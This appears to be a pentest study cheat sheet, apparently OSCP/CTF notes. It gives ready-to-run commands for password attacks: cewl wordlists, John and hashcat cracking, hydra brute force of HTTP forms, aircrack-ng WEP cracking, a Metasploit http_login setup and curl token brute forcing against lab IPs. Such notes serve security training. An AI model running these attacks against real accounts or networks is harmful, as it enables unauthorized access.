# Password Attack
Any possibility that the user will re use the password????

### Wordlists
Generate a custom wordlist
cewl -w createWordlist.txt -m <min password length> https://www.example.com

### Offline
https://hashes.org/search.php

john the ripper
john --wordlist=/user/share/wordlists/rockyou.txt hash.txt

Hashcat << check type online - hashcat sample hash
hashcat -m\<type> -a 0 /usr/share/wordlists/rockyou.txt hash.txt

### Online
HTTP post form

hydra -L <wordlist> -P<password list> <IP> http-post-form "<file path>:username=^USER^&password=^PASS^&Login=Login:<fail message>"

1. easy password? e.g. password, 123456
2. Company or site name or its variations? e.g. use the software name as password
3. Name=Password and other hints
4. Simple sequences
5. Basic words

# WiFi
## WEP
```sh
# -b <bssid> : target selection: access point's MAC
aircrack-ng -b 00:21:91:d2:8e:25 WEP-Cracking.cap
```

# HTTP
## Basic Authentication
metasploit `http_login` module
```sh
use auxiliary/scanner/http/http_login
set RHOSTS 192.165.34.3
set USER_FILE /tmp/users
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set AUTH_URI /poc/
exploit
```
## Token Authentication
Hydra and metasploit `http_login` module doesn’t support token authentication.
We have to set the token in headers for token auth to work.
```sh
curl -H 'Authorization: Token <token>' 192.183.171.3
```
We have to write a custom wrapper around this command. In the script, we will rely on the fact
that on using the correct token, we will get something else than "Unauthorized Access".

You can refer this script <https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts.md#authorization-token>

After performing the dictionary attack we will get the password, which can be used to set the token in the headers
```sh
curl -H 'Authorization: Token 123123123' 192.186.248.3
```

